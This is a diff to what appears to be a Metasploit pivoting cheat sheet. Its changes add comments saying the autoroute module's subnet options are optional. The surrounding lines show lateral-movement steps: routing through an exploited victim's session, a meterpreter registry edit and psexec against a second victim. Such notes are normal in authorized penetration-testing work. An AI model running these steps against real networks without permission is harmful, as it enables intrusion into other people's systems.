@@ -26,7 +26,7 @@ route add [IP] [Subnet Mask of Exploited Target] [Session ID]
 
 use post/multi/manage/autoroute
 set SESSION [Session ID]
-set NETMASK [Subnet Mask of Exploited Target]
+set NETMASK [Subnet Mask of Exploited Target] # Optional.  Autoroute will check the sessions interfaces for subnets.
 run
 ```
 
@@ -741,7 +741,7 @@ meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Service
 # Add route to Victim 2's subnet, pointing to Victim 1's session.
 use post/multi/manage/autoroute
 set SESSION [Victim 1's Session #]
-set SUBNET [Victim 2's Subnet]
+set SUBNET [Victim 2's Subnet] # Optional.  Autoroute will check the sessions interfaces for subnets.
 run
 
 use exploit/windows/smb/psexec
@@ -757,8 +757,8 @@ exploit
 # Add routes to both victims, pointing to Victim 1's session.
 use post/multi/manage/autoroute
 set SESSION [Victim 1's Session ID]
-set SUBNET [Victim 1's Subnet]
-set SUBNET [Victim 2's Subnet]
+set SUBNET [Victim 1's Subnet] # Optional.  Autoroute will check the sessions interfaces for subnets.
+set SUBNET [Victim 2's Subnet] # Optional.  Autoroute will check the sessions interfaces for subnets.
 run
 
 use exploit/windows/smb/psexec
